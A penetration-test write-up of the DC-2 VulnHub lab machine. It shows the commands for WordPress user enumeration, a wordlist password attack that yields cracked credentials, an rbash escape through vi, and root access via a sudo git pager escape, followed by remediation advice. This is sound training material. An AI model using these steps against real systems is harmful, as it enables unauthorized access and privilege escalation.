**Target:** DC-2 (VulnHub)
**Target IP:** 192.168.0.131

**Tester:** MR-R00TX

**Classification:** Internal lab assessment — authorized testing only

---

## 1. Executive Summary

DC-2 is a deliberately vulnerable WordPress-based virtual machine used for penetration testing practice. The objective was to identify and exploit weaknesses in the web application and underlying host, demonstrating a full attack path from unauthenticated reconnaissance to **root-level compromise**.

The assessment identified the following chain of issues:

- An outdated WordPress installation (4.7.10) with username enumeration exposed
- Weak, dictionary-crackable user passwords on a WordPress login that also exposed XML-RPC
- A restricted shell (`rbash`) on the SSH account that could be bypassed through the `vi` editor
- A misconfigured `sudo` rule allowing the `git` command to be run as root, leading to full root compromise

Combined, these findings allowed a complete compromise of the host, from zero credentials to `root`, in a single assessment session.

| Metric | Result |
|---|---|
| Initial access | SSH (user `tom`) |
| Privilege escalation path | Restricted shell bypass → `sudo` misconfiguration (`git`) |
| Final access level | `root` |
| Overall risk | **Critical** |

- **In scope:** DC-2 virtual machine (192.168.0.131), isolated host-only lab network

## 3. Methodology

The assessment followed a standard black-box web application + host penetration testing methodology:

```
Reconnaissance → Enumeration → Credential Attack → Initial Access → Privilege Escalation → Post-Exploitation
```

## 5. Enumeration

### 5.1 WordPress User Enumeration

Nmap's WordPress user enumeration script was run against the login system:

```bash
nmap -p 80 --script http-wordpress-users dc-2
```

**Result:**

```
| http-wordpress-users:
| Username found: admin
| Username found: tom
| Username found: jerry
```

Three valid usernames were confirmed: `admin`, `tom`, `jerry`. These were saved to `users.txt` for the credential attack phase.

### 5.2 Nikto Web Server Scan

```bash
nikto -h http://dc-2
```

**Key findings:**
- Apache 2.4.10 is outdated (current version is 2.4.66+)
- Missing security headers: `Content-Security-Policy`, `X-Content-Type-Options`, `Referrer-Policy`, `Strict-Transport-Security`
- Directory indexing enabled on multiple `wp-content` and `wp-includes` paths
- `wp-login.php` and `/wp-admin` confirmed accessible
- `wordpress_test_cookie` created without the `HttpOnly` flag

### 5.3 WPScan — WordPress-Specific Enumeration

```bash
wpscan --url http://dc-2 --api-token <redacted> -e vp,vt,u
```

**Key findings:**
- **WordPress version 4.7.10** confirmed — flagged as insecure, with 90+ known public vulnerabilities (XSS, SQL injection, authenticated file deletion, privilege escalation, etc.) tracked against this release line
- **XML-RPC enabled** (`xmlrpc.php`) — exposes the site to brute-force/pingback abuse and credential-stuffing attacks
- WordPress `readme.html` publicly accessible (information disclosure)
- Theme in use: `twentyseventeen` (outdated version)
- No plugins or config backups detected

> The full automated vulnerability list from WPScan (90+ CVEs tied to the outdated core version) is not reproduced in full here — it reflects the general insecurity of running an unpatched 2018-era WordPress release rather than vulnerabilities individually exploited in this assessment. The relevant, exploited weakness was the **authentication layer**, detailed below.

## 6. Credential Attack

### 6.1 Wordlist Generation (CeWL)

A custom password wordlist was generated by crawling the target site's content:

```bash
cewl http://dc-2 -w Password.txt
```

### 6.2 Password Attack via XML-RPC

With the username list (`users.txt`) and the generated wordlist (`Password.txt`), WPScan's XML-RPC-based password attack was used (far faster than brute-forcing `wp-login.php` directly, since XML-RPC allows multiple login attempts per request):

```bash
wpscan --url http://dc-2 -U users.txt -P Password.txt --password-attack wp-login
```

**Result:**

```
[SUCCESS] - jerry / adipiscing
[SUCCESS] - tom / parturient
```

**Valid credentials obtained:**

| Username | Password |
|---|---|
| jerry | adipiscing |
| tom | parturient |

With valid WordPress credentials in hand, SSH (port 7744) was tested using the same credential pairs, since password reuse between the CMS and the OS account is a common misconfiguration.

- **tom** — login succeeded:

![SSH access gained as tom](../assets/Pasted%20image%2020261015134908.png)

Access was obtained as the **tom** user, but in a **restricted shell (`rbash`)** — command execution and `PATH` were locked down.

## 8. Privilege Escalation — Breaking Out of the Restricted Shell

### 8.1 Escaping `rbash` via `vi`

The `tom` account could run the `vi` text editor, which is a well-known restricted-shell escape vector. Spawning a shell from inside `vi` bypasses the `rbash` restrictions entirely:

```
vi
:set shell=/bin/sh
:shell
```

![Restricted shell bypass using vi](../assets/Pasted%20image%2020261015140137.png)

### 8.2 Fixing the Environment

The spawned shell initially lacked a usable `PATH`/`SHELL`, so these were corrected manually to restore normal command usage:

```bash
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash:$SHELL
```

![Environment restored after shell escape](../assets/Pasted%20image%2020261015141638.png)
![Shell access confirmed](../assets/Pasted%20image%2020261015141943.png)
![Full shell functionality verified](../assets/Pasted%20image%2020261015142106.png)

## 9. Privilege Escalation — Root via Misconfigured `sudo`

With a functional shell, `sudo -l`-style enumeration revealed that `tom` had passwordless `sudo` rights over the `git` command — a classic GTFOBins privilege-escalation vector, since `git`'s pager/help system can be abused to spawn a root shell.

```bash
sudo git help config
```

Inside the resulting pager, a shell command was entered to spawn an interactive root shell:

```
!/bin/bash
```

This dropped into a **root shell**.

![Root shell obtained via sudo git](../assets/Pasted%20image%2020261015142429.png)
![Root access confirmed](../assets/Pasted%20image%2020261015143105.png)

## 12. Remediation Recommendations

1. **Update WordPress core, themes, and plugins** to the latest supported versions; remove unused themes/plugins.
2. **Disable XML-RPC** if not required, or protect it with rate-limiting, a WAF rule, or an IP allow-list.
3. **Enforce strong password policy** and consider 2FA for WordPress admin and SSH accounts; disable password reuse across CMS and OS accounts.
4. **Harden the restricted shell**: remove or restrict access to editors and interpreters (`vi`, `vim`, `less`, `python`, etc.) that allow shell escapes from `rbash`, or move to a properly jailed environment (chroot/containers).
5. **Audit all `sudo` rules** (`/etc/sudoers`, `sudoers.d/`) and remove unnecessary `NOPASSWD` entries, especially for binaries listed on GTFOBins.
6. **Restrict file permissions** on `wp-config.php` (`640` or stricter) and rotate database credentials.
7. **Add missing HTTP security headers** and disable directory listing (`Options -Indexes` in Apache).

---

## 13. Conclusion

This assessment demonstrates a complete, realistic attack chain against a WordPress-hosted system: from unauthenticated user enumeration, through a credential-stuffing attack against XML-RPC, to a restricted-shell escape and a `sudo` misconfiguration that resulted in full root compromise. No single finding was catastrophic in isolation, but the **chaining** of a weak password policy with shell-restriction and `sudo` misconfigurations led directly to total host compromise — a pattern commonly seen in real-world WordPress hosting environments.
